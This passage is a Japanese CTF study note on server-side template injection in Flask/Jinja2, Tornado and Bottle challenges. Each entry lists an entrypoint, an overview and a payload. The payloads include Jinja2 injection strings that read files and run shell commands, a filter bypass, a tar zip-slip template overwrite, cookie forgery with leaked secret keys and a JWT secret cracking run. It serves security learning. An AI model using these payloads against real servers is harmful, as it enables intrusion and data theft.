`session['golem']`、つまり`Cookie: golem=aaaaa`みたいに値をセットするにはFlaskでは`app.secret_key`で暗号化(?)されることになる。つまり任意の値をCookieにセットするには、この暗号化キーを特定して、暗号化したデータをCookieにセットすればよい。   
今回は暗号化キーは`key.py`から読み込んでいるので、LFIでその内容を出力する。   

- **Payload**    
以下でLFIによって特定した暗号化キーでCookieの値を暗号化する。   
```python
from flask import (
    Flask,
    session)
from flask.ext.session import Session


app = Flask(__name__)
app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"

@app.route('/')
def hello_world():
    session["golem"] = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}" 

    print session
    return session["golem"]
```
これを実行して、暗号化した値をCookieにセットすればFlagゲット！   
## Jinja2 bypass "." "_" / (Asis CTF Quals 2019)
https://fireshellsecurity.team/asisctf-fort-knox/   
- **entrypoint**    
ソースにアクセスできて、`t = Template(question)`がJinja2の脆弱とわかる。   
- **概要**    
以下より、`.`,`_`がフィルタリングされていて、これをBypassしてSSTIしないといけない。   
```python
from flask import Flask, session
from flask_session import Session
from flask import request
from flask import render_template
from jinja2 import Template
 
import fort
 
Flask.secret_key = fort.SECKEY
 
app = Flask(__name__)
app.config['SESSION_TYPE'] = 'filesystem'
app.config['TEMPLATES_AUTO_RELOAD'] = True
Session(app)
 
@app.route("/")
def main():
    return render_template("index.html")
 
@app.route("/ask", methods = ["POST"])
def ask():
    question = request.form["q"]
    for c in "._%":
        if c in question:
            return render_template("no.html", err = "no " + c)
    try:
        t = Template(question)
        t.globals = {}
        answer = t.render({
            "history": fort.history(),
            "credit": fort.credit(),
            "trustworthy": fort.trustworthy()
        })
    except:
        return render_template("no.html", err = "bad")
    return render_template("yes.html", answer = answer)
 
@app.route("/door/<door>")
def door(door):
    if fort.trustworthy():
        return render_template("flag.html", flag = fort.FLAG)
    doorNum = 0
    if door is not None:
        doorNum = int(door)
    if doorNum > 0 and doorNum < 7:
        fort.visit(doorNum)
        return render_template("door.html", door = doorNum)
    return render_template("no.html", err = "Door not found!")
```
`{{ [[]|map|string|list][0][20] }}`で`_`   
`[1|float|string|list][0][1]`で`.`が出力できる！   
- **Payload**    
書かれてるやつがどれもJinja2の環境で動いてない…理解不足…   

## bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog) 
https://ark4rk.hatenablog.com/entry/2020/09/07/004439#web-miniblog   
https://hackmd.io/@ptr-yudai/HylUWdLlD   
https://qiita.com/kusano_k/items/f0774d1fd0aa0ee8f72f   
- **entrypoint**    
blogが作成できるWebページがあって、テンプレートも変更できるようになっている。しかし、`{{}}`や`%`が使えないように制限されているため普通にSSTIできない。   
画像ファイルなどをアップロードするのにtarファイルにしてからそれをサーバー上で解凍しているので、zip slipによってtemplateを上書きすれば、SSTIのフィルタリング無しでtempalteを上書きできる。   
- **概要**    
以下の`/update`では正規表現`r"{{!?[a-zA-Z0-9_]+}}"`によってSSTIができない。   
```python
@route("/update", method="POST")
def do_update_template():
    username = get_username()
    if not username:
        return abort(400)

    content = request.forms.get("content")
    if not content:
        return abort(400)

    if "%" in content:
        return abort(400, "forbidden")

    for brace in re.findall(r"{{.*?}}", content):
        if not re.match(r"{{!?[a-zA-Z0-9_]+}}", brace):
            return abort(400, "forbidden")

    template_path = "userdir/{userid}/template".format(userid=users[username]["id"])
    with open(template_path, "w") as f:
        f.write(content)

    redirect("/")
```
`tarpath`にあるtarファイルを`attachments_dir`に解凍するときに、解凍するときのファイル目が`../template`なら、`attachments_dir`より上のディレクトリのtemplateに上書きできる！   
このZip Slipという脆弱性がPythonのtar関係のライブラリにもあるが直ってないらしい…   
https://bugs.python.org/issue21109   
zip slipについて   
https://cililog.hatenablog.com/entry/2018/09/02/183220   
```python
@route("/upload", method="POST")
def do_upload():
    username = get_username()
    if not username:
        return abort(400)

    attachment = request.files.get("attachment")
    if not attachment:
        return abort(400)

    tarpath = 'tmp/{}'.format(uuid4().hex)
    attachments_dir = "userdir/{userid}/attachments/".format(userid=users[username]["id"])
    attachment.save(tarpath)
    try:
        tarfile.open(tarpath).extractall(path=attachments_dir)
    except (ValueError, RuntimeError):
        pass
    os.remove(tarpath)
    redirect("/")
```
https://alamot.github.io/path_traversal_archiver/   
このツールを使ってパストラバーラルファイル名をtarファイルに簡単に埋め込むことができる。   
- **Payload**    
```txt
// 以下のtemplateというファイルを作成する
<%
    import os

    n = 5
    xs = []
    for i in range(n):
        xs.append(os.listdir(("../" * i) + "."))
    end
%>
% for x in xs:
{{x}}<br>
% end

// 以下で細工したtar.gzファイルを作成してアップロードすると"ls ../"が実行できる
$ python path_traversal_archiver.py template xxx.tar.gz -l 1
```
## tornado / obtain Cookie's secret_key (csictf 2020 The Usual Suspects)
https://dunsp4rce.github.io/csictf-2020/web/2020/07/21/The-Usual-Suspects.html   
- **entrypoint**    
`?icecream=`のGETの中にバッククォートを挿入するとerrorが返るのでSSTI可能とわかる。Flagが出る条件は`admin`というCookieの値が`false`じゃなくて`true`になることらしいので、SSTIでCookieの暗号化に使われているsecret keyを特定する。   
- **概要**    
`?icecream={{globals()}}`を送信するといかが返るのでTornadoとわかる。   
グローバル名前空間にあるシンボル一覧(変数とかオブジェくトとかメソッドとか？)が返るらしい。   
```txt
'application': <tornado.web.Application object at 0x7f2976579750>,

// 他にも以下たちが返るらしい？
'escape', 'xhtml_escape', 'url_escape', 'json_encode', 'squeeze', 'linkify', 'datetime', '_tt_utf8', '_tt_string_types', '__name__', '__loader__', 'chocolate', 'vanilla', 'butterscotch', 'application', 'secret', '__builtins__', '_tt_execute'
```
この中で`application`オブジェクトが怪しいので、`dir(application)`でメンバーを見れるらしい？   
```txt
['__call__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_load_ui_methods', '_load_ui_modules', 'add_handlers', 'add_transform', 'default_host', 'default_router', 'find_handler', 'get_handler_delegate', 'listen', 'log_request', 'on_close', 'reverse_url', 'settings', 'start_request', 'transforms', 'ui_methods', 'ui_modules', 'wildcard_router']
```
この中で`settings`オブジェクトが怪しいらしいので`{{application.settings}}`で`'cookie_secret': 'MangoDB\n'`が返って秘密鍵がわかる？   
- **Payload**    
以下で暗号化したCookieを作成すればOK。   
```python
import tornado.ioloop
import tornado.web
import time

class User(tornado.web.RequestHandler):

    def get(self):
        cookieName = "admin"        
        self.set_secure_cookie(cookieName, 'true')

application = tornado.web.Application([
    (r"/", User),
], cookie_secret="MangoDB\n")

if __name__ == "__main__":
    application.listen(8888)
    tornado.ioloop.IOLoop.instance().start()
```
## jinja RCE / JWT's secret_key crack (HacktivityConCTF 2020 Template Shack)
https://dunsp4rce.github.io/HacktivityCon-CTF/web/2020/08/03/Template-Shack.html   
- **entrypoint**    
JWTがあって、中身は`{  "username": "guest"}`なのでこれを`"admin"`に改竄するために、署名の秘密鍵を辞書攻撃で特定する。そのあと、adminとしてログインしたページのerrorページにユーザーの入力が入っているのでSSTIを試す。   
- **概要**    
リクエスト内容を見ると以下のようにJWTによってログインしてるかどかが管理されている。   
JWTについては以下。   
https://qiita.com/t-toyota/items/8d0ffb265845ab8cc87c   
```txt
GET / HTTP/1.1
Host: jh2i.com:50023
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
JWTではJSONがBase64でエンコードされてるもの＋署名を付けて改竄されているかどうかを確認している。   
https://github.com/lmammino/jwt-cracker   
このツールでJWTの鍵を辞書攻撃できるらしい。   
```txt
Command: 

python3 crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y /usr/share/wordlists/rockyou.txt

Output:

Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
291167it [00:26, 11150.29it/s]Found secret key: supersecret
291167it [00:26, 10911.29it/s]
```
https://jwt.io/   
ここで`VERIFY SIGNATURE`に`supersecret`を入れた状態で作成された`{  "username": "admin"}`のJWTを使えば`admin`としてログインできる！   
- **Payload**    
JWTを付与して、`/admin/{{7*7}}`とかをすると49が返るのでSSTI可能！   
```txt
/admin/{{request.application.globals.builtins.import(‘os’).popen(‘cat flag.txt’).read()}}
```
## sample
- **entrypoint**    
- **概要**    
- **Payload**    
## sample
- **entrypoint**    
- **概要**    
- **Payload**    

## sample
- **entrypoint**    
- **概要**    
- **Payload**    

## Docker環境があるやつ(復習用)
### The Usual Suspects (csictf 2020)
https://github.com/csivitu/ctf-challenges/tree/master/web/The%20Usual%20Suspects   
### miniblog (InterKosenCTF 2020)
https://github.com/theoremoon/InterKosenCTF2020-challenges/tree/master/web/miniblog   
### BuggyBase2 (ISCbughunt101ctf 2020)
https://github.com/8ayac/iscbughunt101ctf/blob/master/buggybase2/README.md   
### Zumbo (BSidesSF CTF 2017)
https://github.com/BSidesSF/ctf-2017-release/blob/master/web/zumbo/README.md   

# メモ
escapeHTMLってどんな感じでエスケープする？   
動的な文字列連結は脆弱になりがちっぽい   
変数名のワードリストがあるぽい   
# 参考
https://portswigger.net/web-security/server-side-template-injection   
SSTIの概要   
https://portswigger.net/research/server-side-template-injection   
各テンプレートエンジンにおけるSSTIの例   
https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/   
TornadoでのSSTI   
https://github.com/epinna/tplmap   
TPLMAPというSSTI検知ツール。脆弱な環境もテスト用にある。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI   
SSTIの脆弱なWebサイト。Docker環境。   
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
SSTIの概要。CTFでのSSTI。   
https://io.cyberdefense.jp/entry/2017/06/12/Server-Side_Template_Injection   
SSTIの説明。日本語。   
https://ierae.co.jp/blog/osc2016do-webappsec/   
SSTIの説明。日本語。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
ここに大体のSSTIの脆弱なソースとそのExploitの例がある。神。   
